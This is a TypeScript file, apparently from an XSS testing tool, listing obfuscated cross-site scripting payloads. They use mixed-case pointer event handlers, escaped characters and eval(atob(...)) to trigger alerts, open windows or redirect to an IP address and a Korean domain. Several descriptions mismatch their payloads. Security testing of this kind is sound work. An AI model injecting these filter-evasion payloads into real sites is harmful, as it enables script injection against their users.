import { XssPayloadsInterface } from "@customtypes/interface";

// ToDo
// 1. HTMl 태그 랜덤 기능
// 2. 속성명 랜덤 기능

export const xssPayloads: XssPayloadsInterface[] = [
  {
    payload: `<p onpoinTerOver=location=\`\u0068tt\x70s\x3a\x2f/211.236.179.244\`>XSS TEST</p>`,
    description: "When pointer is over the paragraph tag, It'll trigger location function",
  },

  {
    payload: `<img src=x onPointerOver=\u0077indow.\u006fpen\`htt\x70\u003a//www.cyberone.kr\`>`,
    description: `When hovered pointer is out of img tag, It'll trigger window open`,
  },
  { payload: `<a href="javascript:alert\`xss\`">dd</a>`, description: `if you click a tag, It'll trigger alert function` },
  {
    payload: `<h1 onpOInterleAVE=\u006cocation=\`\u0068tt\x70\x3a\x2f/211.236.179.244\`>hi</h1>`,
    description: `When pohinter is leaving out of h1 tag, It'll trigger location function`,
  },
  {
    payload: `<img src=z onPoinTerOVeR=\u0065val(\u0061tob\`YWxlcnQoImFsZXJ0Iik7\`);>`,
    description: `When pointer is over the img tag, it'll trigger location function`,
  },
  // `<META HTTP-EQUIV="refresh" CONTENT="20;url=http://www.cyberone.kr">`,
  {
    payload: `<h3 onPOINterLeavE=\u0065val(\u0061tob\`YWxlcnQoImFsZXJ0Iik7\`);>`,
    description: `When pointer is over the h3 tag, it'll trigger location function`,
  },
];
